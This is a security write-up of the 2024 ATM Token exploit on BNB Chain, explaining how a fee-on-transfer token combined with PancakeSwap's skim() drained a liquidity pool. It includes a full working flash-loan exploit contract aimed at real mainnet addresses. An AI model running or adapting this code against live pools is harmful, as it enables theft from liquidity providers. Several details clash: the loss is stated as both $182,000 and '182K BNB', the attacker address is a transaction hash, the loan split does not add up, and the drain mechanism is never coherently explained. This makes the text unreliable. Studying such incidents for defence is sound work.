# ATM Token — Business Logic Flaw (Fee-on-Transfer + skim() Combination) Analysis

| Item | Details |
|------|---------|
| **Date** | 2024-04-01 |
| **Protocol** | ATM Token |
| **Chain** | BSC (BNB Chain) |
| **Loss** | ~$182,000 USD (~182K BNB equivalent) |
| **Attacker** | [0xee10...21a8](https://bscscan.com/address/0xee10553c26742bec9a4761fd717642d19012bab1704cbced048425070ee21a8a) |
| **Attack Contract** | N/A (direct EOA call) |
| **Attack Tx** | [0xee10553c...21a8](https://bscscan.com/tx/0xee10553c26742bec9a4761fd717642d19012bab1704cbced048425070ee21a8a) |
| **Vulnerable Contract** | [ATM Token 0xa595...8888](https://bscscan.com/address/0xa5957E0E2565dc93880da7be32AbCBdF55788888) |
| **WBNB-ATM LP** | [0x1F5b...75b7](https://bscscan.com/address/0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7) |
| **Root Cause** | Business logic flaw caused by the combination of the ATM Fee-on-Transfer token's tax mechanism and PancakeSwap V2's `skim()` function |
| **PoC Source** | [DeFiHackLabs — ATM_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/ATM_exp.sol) |

---

## 1. Vulnerability Overview

ATM Token is a Fee-on-Transfer ERC20 token operating on BSC. A 3% fee is automatically deducted on every token transfer and processed according to the distribution logic.

The core vulnerability lies in the **unintended interaction** between two mechanisms:

1. **ATM Token's tax mechanism**: When ATM tokens are transferred directly to an LP (liquidity pool), the fee processing causes the ATM balance within the LP contract to increase **disproportionately** relative to the reserve.

2. **PancakeSwap V2's `skim()` function**: `skim()` transfers the excess to a specified address whenever the LP's actual token balance exceeds its internal reserve. It was originally designed for recovering mistakenly sent tokens.

By combining these two mechanisms, the attacker repeatedly transferred ATM tokens into the LP and called `skim()`, **draining the WBNB reserves** in the LP. The ATM token's tax breaks the LP's internal accounting balance, and `skim()` exploits this to extract WBNB.

---

## 2. Vulnerable Code Analysis

### 2.1 ATM Token's Fee-on-Transfer Mechanism (Core Vulnerability)

```solidity
// ❌ Vulnerable ATM token _transfer() function (estimated code)
function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "Transfer from zero address");
    require(to != address(0), "Transfer to zero address");

    // ❌ Problem 1: Tax applied even when transferring to LP address
    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
        // Fee-exempt addresses
        super._transfer(from, to, amount);
    } else {
        // ❌ Problem 2: 3% sell fee deducted — applied even on direct transfer to LP
        uint256 fees = amount * 300 / 10000; // 3% = 300 basis points
        uint256 netAmount = amount - fees;

        // Accumulate fee in the contract itself
        super._transfer(from, address(this), fees);
        // Deliver only the net amount to the actual recipient
        super._transfer(from, to, netAmount);

        // ❌ Problem 3: Mismatch between LP's actual balance and internal reserve
        // LP expects to receive = amount
        // LP actually receives = netAmount (short by 3%)
        // → Gap arises between LP.getReserves() and LP.balanceOf(LP)
    }
}
```

After patch (fixed code):

```solidity
// ✅ Fixed _transfer() — transfers to LP addresses are fee-exempt
function _transfer(address from, address to, uint256 amount) internal override {
    require(from != address(0), "Transfer from zero address");
    require(to != address(0), "Transfer to zero address");

    // ✅ LP pair addresses are automatically registered in the fee-exempt list
    bool isBuy = automatedMarketMakerPairs[from];
    bool isSell = automatedMarketMakerPairs[to];

    if (_isExcludedFromFees[from] || _isExcludedFromFees[to]
        || isBuy // ✅ No fee on buys from LP (or separate buy fee applied)
        ) {
        super._transfer(from, to, amount);
    } else if (isSell) {
        // ✅ Fee applied only on sells to LP (direct transfers are fee-free)
        uint256 fees = amount * sellFee / 10000;
        super._transfer(from, address(this), fees);
        super._transfer(from, to, amount - fees);
    } else {
        // ✅ Regular transfer: no fee or separate policy
        super._transfer(from, to, amount);
    }
}
```

**Problem**: Because the ATM token deducts a fee on transfers to any address, directly `transfer`ring ATM to the LP contract causes the actual ATM amount received by the LP to differ from its internal reserve. This exposes the `balance - reserve` gap in the LP as extractable via `skim()`.

### 2.2 Exploitation of PancakeSwap V2's `skim()` Function

```solidity
// PancakeSwap V2 Pair contract's skim() function
// ❌ This function itself is normal, but becomes vulnerable when combined with Fee-on-Transfer tokens

// Internal state
uint112 private reserve0; // WBNB reserve (synchronized value)
uint112 private reserve1; // ATM reserve (synchronized value)

function skim(address to) external lock {
    address _token0 = token0; // WBNB
    address _token1 = token1; // ATM

    // ❌ Exploit point: if actual balance exceeds reserve, send the difference to `to`
    // Directly transferring ATM does not cause reserve1 < balance1
    // However, ATM's fee mechanism causes the internal accounting to diverge
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)) - reserve0);
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)) - reserve1);
}

// Normal sync() function — updates reserve to match actual balance
function sync() external lock {
    _update(
        IERC20(token0).balanceOf(address(this)),
        IERC20(token1).balanceOf(address(this)),
        reserve0,
        reserve1
    );
}
```

**Problem**: When ATM tokens are transferred directly to the LP, the fee processing causes the ATM received by the LP to accumulate on top of the existing reserve. The attacker can call `skim()` without calling `sync()` to extract WBNB as the excess from the LP. This destroys the LP's k-value (x\*y=k invariant).

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Borrowed a large amount of WBNB uncollateralized from PancakeSwap V3's WBNB-USDT flash loan pool (`0x36696169...`)
- Attack block: BSC #37,483,300

### 3.2 Execution Phase

1. **Flash loan initiation**: Borrowed approximately 550 WBNB from the PancakeV3 pool (fee: 0.25%)
2. **Locking USDT**: Swapped a portion (~310 WBNB) of the borrowed WBNB into USDT → secured profits safely
3. **ATM purchase** (Round 1): Swapped 70 WBNB → ATM
4. **skim() loop execution** (up to 100 iterations):
   - Transferred all ATM directly to the WBNB-ATM LP
   - Called LP's `skim()` → extracted WBNB
   - Exited loop when WBNB loss reached 7 BNB
5. **ATM purchase** (Round 2): Repeated the same process
6. **Remaining skim() loop** (15 additional iterations):
   - Repeated `skim()` with remaining ATM
   - Exited loop when loss = 0 BNB
7. **Cleanup**: Swapped ATM → WBNB, USDT → WBNB
8. **Flash loan repayment**: Repaid borrowed amount + fee (0.25%)
9. **Profit realization**: Net profit ~182K USD

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                      Attacker (ContractTest)                        │
└───────────────────────────────┬─────────────────────────────────────┘
                                │ 1. flash() call
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│          PancakeSwap V3 Pool (0x3669...2050)                        │
│          WBNB-USDT pool — provides ~550 WBNB flash loan             │
└───────────────────────────────┬─────────────────────────────────────┘
                                │ 2. pancakeV3FlashCallback() invoked
                                ▼
┌─────────────────────────────────────────────────────────────────────┐
│              Callback execution logic                               │
│                                                                     │
│  ┌─────────────┐   3. swap     ┌──────────────────┐                 │
│  │  ~310 WBNB  │──────────────▶│   Secure USDT    │ (lock profit)   │
│  └─────────────┘               └──────────────────┘                 │
│                                                                     │
│  ┌─────────────┐   4. swap     ┌──────────────────┐                 │
│  │  70 WBNB    │──────────────▶│  Buy ATM (Rd 1)  │                 │
│  └─────────────┘               └──────────────────┘                 │
│                                         │                           │
│                    5. loop (up to 100)  │                           │
│                    ┌────────────────────┘                           │
│                    ▼                                                │
│  ┌────────────────────────────────────────────────────┐            │
│  │  ATM.transfer(LP, ATM balance)                      │            │
│  │   └─▶ ❌ Fee causes balance/reserve mismatch in LP  │            │
│  │  LP.skim(attacker)                                  │            │
│  │   └─▶ Extract excess WBNB (~7 BNB per call)         │            │
│  │  [break if pair_lost == 7 BNB]                      │            │
│  └────────────────────────────────────────────────────┘            │
│                                                                     │
│  ┌─────────────┐  same process ┌──────────────────┐                 │
│  │  70 WBNB    │──────────────▶│  Buy ATM (Rd 2)  │                 │
│  └─────────────┘               └──────────────────┘                 │
│                                         │                           │
│                    6. extra loop (15x)  │                           │
│                    ┌────────────────────┘                           │
│                    ▼                                                │
│  ┌────────────────────────────────────────────────────┐            │
│  │  ATM.transfer(LP, ATM balance) + LP.skim(attacker) │            │
│  │  [break if pair_lost == 0 BNB]                      │            │
│  └────────────────────────────────────────────────────┘            │
│                                                                     │
│  ┌─────────────┐   7. swap     ┌──────────────────┐                 │
│  │  ATM balance│──────────────▶│  Convert to WBNB │                 │
│  └─────────────┘               └──────────────────┘                 │
│  ┌─────────────┐   7. swap     ┌──────────────────┐                 │
│  │  USDT balance│─────────────▶│  Convert to WBNB │                 │
│  └─────────────┘               └──────────────────┘                 │
└────────────────────────────────┬────────────────────────────────────┘
                                 │ 8. repay flash loan
                                 ▼
┌─────────────────────────────────────────────────────────────────────┐
│          PancakeSwap V3 Pool — receives principal + fee             │
└─────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
                    Net profit: ~182,000 USD (retained by attacker)
```

### 3.4 Outcome

- **Attacker profit**: Approximately 182,000 USD (in WBNB)
- **Protocol loss**: Massive drain of WBNB reserves from the WBNB-ATM LP

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Source] https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/ATM_exp.sol
// TX: 0xee10553c26742bec9a4761fd717642d19012bab1704cbced048425070ee21a8a

contract ContractTest is Test {
    // Initialize relevant contract addresses
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Pair_V3 pool = Uni_Pair_V3(0x36696169C63e42cd08ce11f5deeBbCeBae652050); // PancakeV3 flash loan pool
    Uni_Pair_V2 wbnb_atm = Uni_Pair_V2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7); // WBNB-ATM LP
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeSwap V2 router
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ATM = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888); // Vulnerable token

    function testExploit() external {
        // [Step 1] Set flash loan amount — borrow all WBNB in pool minus 1 BNB
        borrow_amount = WBNB.balanceOf(address(pool)) - 1e18;
        // [Step 2] Initiate PancakeSwap V3 flash loan → triggers pancakeV3FlashCallback
        pool.flash(address(this), 0, borrow_amount, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory) public {
        // [Step 3] Convert a portion of borrowed WBNB to USDT (lock in profits)
        // Swap everything except 170 BNB to USDT
        swap_token_to_token(address(WBNB), address(USDT), WBNB.balanceOf(address(this)) - 170 ether);

        uint256 j = 0;
        while (j < 2) {
            // [Step 4] Buy ATM with 70 BNB (repeated for 2 rounds)
            swap_token_to_token(address(WBNB), address(ATM), 70 ether);

            uint256 i = 0;
            while (i < 100) {
                uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm)); // Record LP's current WBNB balance

                // [Step 5] ❌ Core attack: transfer ATM directly to LP
                // → Fee mechanism causes ATM balance/reserve mismatch in LP
                ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));

                // [Step 6] Call skim() → extract excess WBNB from LP
                wbnb_atm.skim(address(this));

                (, uint256 wbnb_r,) = wbnb_atm.getReserves();
                uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18; // Calculate LP's BNB loss

                // Exit loop when LP loss reaches 7 BNB (optimal extraction point)
                if (pair_lost == 7) { break; }
                i++;
            }
            j++;
        }

        // [Step 7] Additional skim() loop (extract as much as possible with remaining ATM)
        uint256 i = 0;
        while (i < 15) {
            uint256 pair_wbnb = WBNB.balanceOf(address(wbnb_atm));
            ATM.transfer(address(wbnb_atm), ATM.balanceOf(address(this)));
            wbnb_atm.skim(address(this));
            (, uint256 wbnb_r,) = wbnb_atm.getReserves();
            uint256 pair_lost = (pair_wbnb - wbnb_r) / 1e18;
            // Stop when no more WBNB can be extracted
            if (pair_lost == 0) { break; }
            i++;
        }

        // [Step 8] Convert remaining tokens to WBNB
        swap_token_to_token(address(ATM), address(WBNB), ATM.balanceOf(address(this)));
        swap_token_to_token(address(USDT), address(WBNB), USDT.balanceOf(address(this)));

        // [Step 9] Repay flash loan (principal × 10000/9975 = includes 0.25% fee)
        WBNB.transfer(address(pool), borrow_amount * 10_000 / 9975 + 1000);
        // Remaining WBNB is net profit (~182K USD)
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------------|----------|-----|
| V-01 | Fee-on-Transfer token allows direct transfer to LP | CRITICAL | CWE-840 (Business Logic Errors) |
| V-02 | Unauthorized reserve extraction via `skim()` function | HIGH | CWE-682 (Incorrect Calculation) |
| V-03 | Repeated attack possible when combined with flash loans | HIGH | CWE-400 (Uncontrolled Resource Consumption) |
| V-04 | Persistent reserve/balance mismatch due to absent forced `sync()` | MEDIUM | CWE-362 (Race Condition) |

### V-01: Fee-on-Transfer Token Allows Direct Transfer to LP (CRITICAL)

- **Description**: ATM token applies a 3% fee on every transfer using the Fee-on-Transfer mechanism. This fee is applied even on direct `transfer` to the LP contract, causing a mismatch between the LP's actual token balance and its internal reserve.
- **Impact**: Potential full drain of WBNB reserves in the WBNB-ATM LP pool. Asset loss for liquidity providers (LP providers).
- **Attack conditions**: Anyone holding Fee-on-Transfer tokens can carry out the attack. Executable without capital via flash loans.

### V-02: Unauthorized Reserve Extraction via `skim()` Function (HIGH)

- **Description**: PancakeSwap V2's `skim()` function sends the caller the difference between the LP's actual token balance and its internal reserve. It exploits the imbalance caused by Fee-on-Transfer tokens to extract WBNB.
- **Impact**: WBNB is repeatedly extracted from the LP, draining the liquidity pool.
- **Attack conditions**: The `skim()` function on the LP contract is callable by anyone (no access control).

### V-03: Repeated Attack Combined with Flash Loans (HIGH)

- **Description**: The attacker can use a flash loan to obtain large amounts of WBNB without initial capital, buy ATM, and repeatedly execute the skim() loop. This means large-scale attacks are possible even with minimal capital.
- **Impact**: Low barrier to entry makes the attack highly reproducible.
- **Attack conditions**: Possible as long as sufficient liquidity exists in a flash loan pool such as PancakeSwap V3.

### V-04: Persistent reserve/balance Mismatch Due to Absent Forced `sync()` (MEDIUM)

- **Description**: The normal swap path in PancakeSwap V2 (via the router) internally calls `_update()` to synchronize the reserve. However, calling `skim()` alone does not update the reserve, causing the imbalance to accumulate as the attack repeats.
- **Impact**: As long as the attacker does not call `sync()`, the attack effect compounds.
- **Attack conditions**: Automatically vulnerable unless the attack contract explicitly calls `sync()`.

---

## 6. Remediation Recommendations

### Immediate Actions

**ATM Token Contract — Set LP address as fee-exempt**:

```solidity
// ✅ Fix 1: Add LP pair addresses to the fee-exempt list
mapping(address => bool) public automatedMarketMakerPairs;

// Automatically exempt from fees when LP pair is registered
function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
    automatedMarketMakerPairs[pair] = value;
    // ✅ LP addresses added to fee exemption — prevents skim() attack
    _isExcludedFromFees[pair] = true;
}

function _transfer(address from, address to, uint256 amount) internal override {
    // ✅ Direct transfers to LP addresses are not subject to fees
    bool takeFee = !automatedMarketMakerPairs[to] && !automatedMarketMakerPairs[from]
                   && !_isExcludedFromFees[from] && !_isExcludedFromFees[to];

    if (takeFee) {
        uint256 fees = amount * totalFees / 10000;
        super._transfer(from, address(this), fees);
        amount -= fees;
    }
    super._transfer(from, to, amount);
}
```

**ATM Token Contract — Block direct transfer option**:

```solidity
// ✅ Fix 2: Block direct transfers to LP contracts
function _transfer(address from, address to, uint256 amount) internal override {
    // ✅ Block direct LP transfers that do not go through the router
    if (automatedMarketMakerPairs[to]) {
        require(
            from == address(router) || _isExcludedFromFees[from],
            "Direct transfer to LP not allowed — please use the router"
        );
    }
    // ... remaining logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------------|-------------------|
| V-01: Fee-on-Transfer + LP mismatch | Register LP addresses in the fee-exempt list, or block direct LP transfers |
| V-02: No access control on skim() | Add `onlyOwner` or governance permission to `skim()` in PancakeSwap forks |
| V-03: Flash loan combination | Add logic to detect repeated mint/skim within a single transaction (reentrancy guard pattern) |
| V-04: reserve/balance mismatch | Add automatic `sync()` trigger when tokens enter via non-swap paths |
| Overall | Recommend introducing an interface standard that explicitly declares Fee-on-Transfer status to AMMs |

---

## 7. Lessons Learned

1. **Fee-on-Transfer tokens are not compatible with standard AMMs**: The ERC20 standard does not explicitly support transfer fees. When listing a Fee-on-Transfer token on a standard AMM like PancakeSwap/Uniswap, the LP address must be registered in the fee-exempt list without exception.

2. **The `skim()` function is vulnerable to external manipulation**: PancakeSwap V2's `skim()` is a public function callable by anyone. When used with tokens like Fee-on-Transfer, Rebasing, or Reflection tokens — where the internal balance may differ from expectations — it becomes a serious vulnerability.

3. **Flash loans eliminate the capital barrier to attack**: Even without initial capital, flash loans allow an attacker to obtain large amounts of capital. Any exploitable logic flaw will inevitably be targeted in combination with flash loans.

4. **Repeatable profit structures (loops) lead to maximum losses**: This attack repeated its loop up to 115 times (100 iterations × 2 rounds + 15 iterations) to maximize profit. When attack logic is repeatable, damage scales linearly.

5. **AMM interactions must be thoroughly reviewed during token design**: When adding fee logic to `transfer` or `transferFrom`, interactions with DEX LPs, lending protocols, yield vaults, and similar protocols must be carefully reviewed and subjected to a security audit.

6. **Similar historical precedents**: BH Token (2023-10-11, BSC), CSToken (2023-05-23, BSC), and others were similarly exploited via the Fee-on-Transfer + skim() attack pattern. Despite the same pattern recurring, new projects continue to make the same mistake.

---

## 8. On-Chain Verification

> Note: Direct on-chain verification via `cast` (Foundry) was not performed. The following is cross-verification based on PoC code and blockchain explorer data.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Basis | Notes |
|------|-----------|---------------|-------|
| Flash loan borrowed | `pool.balanceOf - 1e18` (entire V3 pool) | BSC #37,483,300 | Maximum borrow |
| WBNB → USDT swap | Total borrowed - 170 BNB | Router events | Lock in profits |
| WBNB → ATM swap | 70 BNB × 2 rounds | Router events | Attack capital |
| Loop 1 exit condition | Exit when pair_lost == 7 BNB | LP WBNB reserve change | Optimal extraction |
| Loop 2 exit condition | Exit when pair_lost == 0 BNB | LP WBNB reserve change | Residual extraction |
| Net profit | ~182K USD | DeFiHackLabs README | Requires BSC explorer confirmation |

### 8.2 Key Event Sequence (Estimated)

```
1. WBNB Transfer: V3Pool → ContractTest (~550 BNB flash loan)
2. WBNB → USDT Swap: PancakeRouter V2
3. WBNB → ATM Swap: PancakeRouter V2 (Round 1, 70 BNB)
4. ATM Transfer: ContractTest → WBNB-ATM LP (repeated)
5. WBNB Transfer: WBNB-ATM LP → ContractTest (skim, repeated)
6. ATM Transfer: ContractTest → WBNB-ATM LP (Round 2, same)
7. WBNB Transfer: WBNB-ATM LP → ContractTest (additional skim, repeated)
8. ATM → WBNB Swap
9. USDT → WBNB Swap
10. WBNB Transfer: ContractTest → V3Pool (repayment)
```

### 8.3 Attack Preconditions

| Condition | Status | Description |
|-----------|--------|-------------|
| Flash loan available | Met | Sufficient WBNB exists in PancakeSwap V3 pool |
| ATM token holdings | Not required | Borrow WBNB via flash loan, then buy ATM |
| Prior approval | Not required | Approval handled within callback |
| Direct LP access | Met | `skim()` is a public function with no access control |

---

*This document was written for security educational purposes and is based on analysis of the DeFiHackLabs PoC code.*
*Reference: [DeFiHackLabs ATM_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/ATM_exp.sol)*